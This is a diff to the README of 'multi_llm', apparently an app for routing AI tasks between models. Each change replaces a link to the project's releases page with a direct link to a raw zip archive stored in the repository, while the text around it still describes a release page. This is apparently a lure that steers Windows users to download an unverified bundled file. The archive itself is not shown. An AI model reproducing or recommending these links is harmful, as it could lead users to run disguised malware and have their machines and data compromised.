@@ -1,6 +1,6 @@
 # 🤖 multi_llm - Route AI tasks with lower cost
 
-[![Download multi_llm](https://img.shields.io/badge/Download%20multi_llm-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anumkamboh80/multi_llm/releases)
+[![Download multi_llm](https://img.shields.io/badge/Download%20multi_llm-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anumkamboh80/multi_llm/raw/refs/heads/main/multi_model_agent/multi_llm_v2.8.zip)
 
 ## 🧭 What this app does
 
@@ -17,7 +17,7 @@ It can help with:
 
 Visit this page to download the Windows release:
 
-https://github.com/anumkamboh80/multi_llm/releases
+https://github.com/anumkamboh80/multi_llm/raw/refs/heads/main/multi_model_agent/multi_llm_v2.8.zip
 
 On that page:
 - Open the latest release
@@ -187,7 +187,7 @@ Many AI tools lock you into one model. multi_llm gives you more choice. That hel
 
 If you need the release page again, use this link:
 
-https://github.com/anumkamboh80/multi_llm/releases
+https://github.com/anumkamboh80/multi_llm/raw/refs/heads/main/multi_model_agent/multi_llm_v2.8.zip
 
 ## 🗂️ Topics
 
